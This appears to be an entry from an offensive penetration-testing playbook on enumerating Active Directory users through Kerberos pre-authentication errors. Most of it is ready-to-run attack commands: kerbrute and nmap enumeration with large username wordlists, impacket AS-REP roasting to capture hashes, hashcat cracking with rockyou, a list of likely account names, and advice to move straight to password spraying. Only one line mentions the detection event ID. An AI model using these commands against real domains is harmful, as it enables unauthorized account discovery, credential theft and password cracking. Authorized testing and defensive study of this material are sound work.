---
id: kerberos-enum
title: Kerberos User Enumeration
stage: enumeration
tags: [windows, ad, kerberos]
tools:
  - kerbrute userenum -d domain.local --dc $DC /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
  - nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm='domain.local',userdb=/tmp/users.txt $DC
  - impacket-GetNPUsers domain.local/ -no-pass -usersfile users.txt -dc-ip $DC
leads_to: [asreproast, kerberoast, password-spray, ldap-enum]
summary: Enumerate valid domain users via Kerberos pre-authentication error differences — no credentials needed.
---

## Kerbrute — User Enumeration

Kerbrute exploits the KDC returning different error codes (`KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN` vs `PREAUTH_REQUIRED`) to confirm valid users without authenticating.

```bash
kerbrute userenum \
  -d domain.local \
  --dc $DC \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -o valid_users.txt

# Smaller wordlist — faster
kerbrute userenum -d domain.local --dc $DC \
  /usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

## Nmap Kerberos Enum

```bash
nmap -p88 --script krb5-enum-users \
  --script-args krb5-enum-users.realm='domain.local',userdb=/tmp/users.txt \
  $DC
```

## ASREPRoast Immediately After

Once you have a valid user list, immediately test for AS-REP roastable accounts (no pre-auth required):

```bash
impacket-GetNPUsers domain.local/ -no-pass \
  -usersfile valid_users.txt \
  -dc-ip $DC \
  -outputfile asrep_hashes.txt

# Crack any hashes found
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Common AD Usernames to Try First

```
administrator, admin, guest, krbtgt
svc-backup, svc-admin, svc-sql, service
helpdesk, support, it-admin
```

## Notes

- No credentials required — works from a pure network foothold
- Detected by event ID 4768 with failure code 0x6 (`ERR_C_PRINCIPAL_UNKNOWN`) at the DC
- Use the found usernames immediately for password spraying and ASREPRoasting
- `kerbrute` also has `passwordspray` and `bruteuser` modes once you have a user list
